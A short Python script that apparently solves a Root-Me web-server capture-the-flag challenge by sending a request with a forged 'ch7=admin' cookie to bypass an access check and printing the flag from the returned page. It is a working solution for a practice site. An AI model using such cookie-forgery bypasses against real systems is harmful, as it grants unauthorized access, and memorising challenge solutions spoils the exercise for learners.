import requests
from bs4 import BeautifulSoup


url = 'http://challenge01.root-me.org/web-serveur/ch7/'
page_code = requests.get(url, params={'c': 'visiteur'}, cookies={'ch7': 'admin'}).text

soup = BeautifulSoup(page_code, 'lxml')
flag = soup.find('div')
print(flag.text)
